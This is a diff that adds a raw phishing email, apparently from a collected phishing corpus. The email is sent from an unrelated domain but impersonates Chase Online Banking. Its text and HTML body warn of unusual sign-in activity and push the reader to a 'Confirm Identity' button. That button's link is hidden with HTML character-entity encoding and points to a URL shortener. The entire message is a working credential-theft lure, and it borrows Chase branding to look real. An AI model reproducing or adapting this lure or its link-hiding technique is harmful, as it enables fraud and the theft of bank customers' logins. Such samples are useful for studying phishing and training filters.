@@ -1,0 +1,188 @@
+Return-Path: no-reply@jsproducts.org
+Delivered-To: jose@monkey.org
+X-FDA: 81025006230.26.325CC61
+Received: from mailu.jsproducts.org (mailu.steelmantools.com [165.232.149.214])
+	by imf21.b.hostedemail.com (Postfix) with ESMTP id 24A3C180009
+	for <jose@monkey.org>; Tue, 18 Jul 2023 14:45:33 +0000 (UTC)
+Authentication-Results: imf21.b.hostedemail.com;
+	dkim=pass header.d=jsproducts.org header.s=dkim header.b=hZBHpO4f;
+	dmarc=pass (policy=reject) header.from=jsproducts.org;
+	arc=pass ("jsproducts.org:s=dkim:i=1");
+	spf=pass (imf21.b.hostedemail.com: domain of no-reply@jsproducts.org designates 165.232.149.214 as permitted sender) smtp.mailfrom=no-reply@jsproducts.org
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1689691534;
+	h=from:from:sender:reply-to:subject:subject:date:message-id:to:to:cc:
+	 mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:in-reply-to:references:dkim-signature;
+	bh=HvLH0RW18MWVNM03E5ldpj+qTWhcsufQNNRai5zPGRA=;
+	b=wMMUu/MQYSrpMz/aGh7UN9cj1Mn2MCM6V+xUYhFccuA0QCfvPoNicYw9Cn5Zsjkm3fmwll
+	iAtWdjYHW/BYi/HAuNz16JtVsht7gqkKMYzEwml0AAC71w/3DoJGC3HYvUytrdrW1wLIQa
+	s4c96omK24z520mQcW76rJCbcIEUWYU=
+ARC-Authentication-Results: i=2;
+	imf21.b.hostedemail.com;
+	dkim=pass header.d=jsproducts.org header.s=dkim header.b=hZBHpO4f;
+	dmarc=pass (policy=reject) header.from=jsproducts.org;
+	arc=pass ("jsproducts.org:s=dkim:i=1");
+	spf=pass (imf21.b.hostedemail.com: domain of no-reply@jsproducts.org designates 165.232.149.214 as permitted sender) smtp.mailfrom=no-reply@jsproducts.org
+ARC-Seal: i=2; s=arc-20220608; d=hostedemail.com; t=1689691534; a=rsa-sha256;
+	cv=pass;
+	b=FaJxZ8WgTxbL/IutD1v072bBQWXQ12jV+77A/96y9N1at0OKnsPbLfqWGeo4E3jC/UIw+w
+	zeUGdxYN4Z7nGwGqPhlk0Ums95wphvTOalRJO2b9hp7Uk+c9HixFU69awruUdoPS1Rdcvf
+	wXIwZmJkutpEEaSlzXjbGMdmSF0BxJQ=
+Received: from authenticated-user (PRIMARY_HOSTNAME [PUBLIC_IP])
+	by mailu.jsproducts.org (Postfix) with ESMTPA id E5B7478100C0
+	for <jose@monkey.org>; Tue, 18 Jul 2023 14:45:29 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=jsproducts.org;
+	s=dkim; t=1689691531;
+	h=from:from:reply-to:subject:subject:to:to:cc:mime-version:mime-version:
+	 content-type:content-type; bh=HvLH0RW18MWVNM03E5ldpj+qTWhcsufQNNRai5zPGRA=;
+	b=hZBHpO4fYclJCIw0aYyav2dCPcVXcY3SasHFY/wBjhqIBvJis2g6eNW8h6uoHwmqS1J1RB
+	DAH84jjTNMcIh/pOQOiTdphrwsNeDvlKMacmK3GVANnOZjMzQvrjIuwxBQ4ZCScKw1xvA9
+	gX+hEJX89uCk0tG99N5wwjFWRNxB6iw=
+Content-Type: multipart/alternative; boundary="----=_Boundary_56325_635761706.3752256764632"
+MIME-Version: 1.0
+From: "=?utf-8?q?Tara_Smith?=" <no-reply@jsproducts.org>
+To: jose <jose@monkey.org>
+Subject: Your attention is required
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=jsproducts.org;
+	s=dkim; t=1689691532;
+	h=from:from:reply-to:subject:subject:to:to:cc:mime-version:mime-version:
+	 content-type:content-type; bh=HvLH0RW18MWVNM03E5ldpj+qTWhcsufQNNRai5zPGRA=;
+	b=uwutEAcIiEWC5AWZ6mF1LIvGEbw/FgYVEJ2WWUVFhQKuZzNeG40+S1i1aMvvIHHFb0V/Jm
+	PyqflXBei7xdhJZc33563B+FFwL0r4PW7P3NpS8Eoa8s4ksdJQWvXWEfMXTWN0Cxf3zOfw
+	I4V4LKvC0/7Ag4Z7teN5+i6jtnO2KWE=
+ARC-Seal: i=1; s=dkim; d=jsproducts.org; t=1689691532; a=rsa-sha256;
+	cv=none;
+	b=cS2xnBoDNo3fj1E+7nsVZBNWshnAoNxhDVNdYEmxqLLOeOGUmvUjz9G7bbtyV0pS5QyTVv
+	i7jgqlBa6ah7nNvmGjzukGq7EDN24iP6Iz/sVb5yVwyurlqBc1nH1uKAjy6tJeCuFcO9WO
+	YOEb+1DtH1GtCt8mrXpmFDHx42twurw=
+ARC-Authentication-Results: i=1;
+	mailu.jsproducts.org;
+	auth=pass smtp.auth=no-reply@jsproducts.org smtp.mailfrom=no-reply@jsproducts.org
+X-Spamd-Bar: +++++
+X-Spam-Level: *****
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 24A3C180009
+X-Stat-Signature: fu3ktwyipak3wnkfecjx6bo6zcwt3ksw
+X-Rspam-User: 
+X-Spam-Status: Yes, score=23.25
+X-HE-Tag: 1689691533-65708
+X-HE-Meta: U2FsdGVkX18sa4YtaT7vvqknfNiKWcvIgBE2r8jAse/4D7C8/OrzXzSd+Epguu1GiuDoWbt34E9Cbrh/wsjuVuNXSOWP+Djh4h1eODqhapUFqpzvguQh50cT2AdZMQrtrmNx4Qt9bVtqv32NNDeHvMuRG1rpeBTU0HcmcQg40fLRI41E33qb/z/ttJ9ILgC9A21HfF6+P62nSoxObeZKdECNqhNiqU/qAge91geXUT0=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 200
+
+------=_Boundary_56325_635761706.3752256764632
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+
+We're
+writing to let you know that we detected something unusual about recent
+sign-in to your Chase Online deposit account.
+To help keep your account safe, we require an extra security challenge we c=
+an
+help you take corrective action. Please log on to your Chase Online
+account by clicking on
+ Dear Customer:
+
+						Recently, there's been activity in your account that seems unusual
+Compared to your Normal account activities..
+
+What do you need to do?
+
+						Please visit the following link to confirm your account information.
+					=09
+Confirm Identity
+
+						Note: This may have happened because you're using a device you don't =
+usually use or
+						you cleared the data on your browser.
+					=09
+						Thank you for helping us keep your account safe.
+					=09
+						Sincerely,=20
+
+						Online Banking Team=20
+
+
+------=_Boundary_56325_635761706.3752256764632
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<title></title>
+	</head>
+	<body style=3D"background:#ececec;" width=3D"100%">
+	<span class=3D"mcnPreviewText" style=3D"overflow: hidden; display: none; f=
+ont-size: 0px; line-height: 0px; max-height: 0px; max-width: 0px; opacity: =
+0; visibility: hidden;">We're
+writing to let you know that we detected something unusual about recent
+sign-in to your Chase Online deposit account.
+To help keep your account safe, we require an extra security challenge we c=
+an
+help you take corrective action. Please log on to your Chase Online
+account by clicking on</span>
+	<table align=3D"center" ><tbody><tr><td><table style=3D"width:560px;border=
+-radius:6px 6px 0 0;background:#ffffff;margin:0 auto;font-size:12px" cellsp=
+acing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"background:#fff;text-=
+align:center">
+	<p><img src=3D"https://www.chase.com/content/dam/chaseonline/en/alerts/ond=
+emand/eventdriven/mol/images/chaseNew.gif" width=3D"140" height=3D"26"></p>
+	</td></tr></tbody></table><table style=3D"font-size:12px;width:560px;margi=
+n:0 auto;border-radius:0 0 6px 6px;background:#ffffff" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody>
+	<tr><td style=3D"padding:18px 30px 20px 30px;font-family: sans-serif;
+        font-size: 14px;
+        font-weight: normal;
+        margin: 0;
+        margin-bottom: 15px; " colspan=3D"2">  <p>Dear Customer:</p>
+                        <p>
+						Recently, there's been activity in your account that seems unusual<br>
+Compared to your Normal account activities..<br>
+					=09
+					<br>
+					<b>What do you need to do?</b>
+					<br><br>
+						Please visit the following link to confirm your account information.
+						<br><br>
+					=09
+<div align=3D"center" style=3D"Margin:0;padding:5px;"><span class=3D"es-but=
+ton-border" style=3D"border-style:solid;border-color:#2CB543;background:#35=
+81D0;border-width:0px;display:inline-block;border-radius:25px;width:auto"><=
+a href=3D"https://&#x62;&#x69;&#x74;&#x2e;&#x6c;&#x79;&#x2f;&#x33;&#x4a;&#x=
+78;&#x68;&#x44;&#x44;&#x57;" class=3D"es-button" target=3D"_blank" style=3D=
+"mso-style-priority:100 !important;text-decoration:none;-webkit-text-size-a=
+djust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-fami=
+ly:arial, 'helvetica neue', helvetica, sans-serif;font-size:16px;color:#FFF=
+FFF;border-style:solid;border-color:#3581D0;border-width:8px 50px;display:i=
+nline-block;background:#3581D0;border-radius:30px;font-weight:normal;font-s=
+tyle:normal;line-height:22px;width:auto;text-align:center">Confirm Identity=
+</a></span></div>=20
+
+						<br>
+						Note: This may have happened because you're using a device you don't =
+usually use or
+						you cleared the data on your browser.
+						<br><br>
+						Thank you for helping us keep your account safe.
+						<br>
+						Sincerely, <br>
+						<br>
+						Online Banking Team <br>
+						=09
+						</td></tr>
+
+	<tr><td style=3D"padding-left:30px;border-radius:0 0 0 6px;background:#faf=
+afa;height:6px"></td><td style=3D"padding-right:30px;border-radius:0 0 6px =
+0;background:#fafafa;height:6px"></td></tr></tbody></table></td></tr></tbod=
+y></table></td></tr></tbody></table>
+	</body>
+</html>
+
+------=_Boundary_56325_635761706.3752256764632--
+
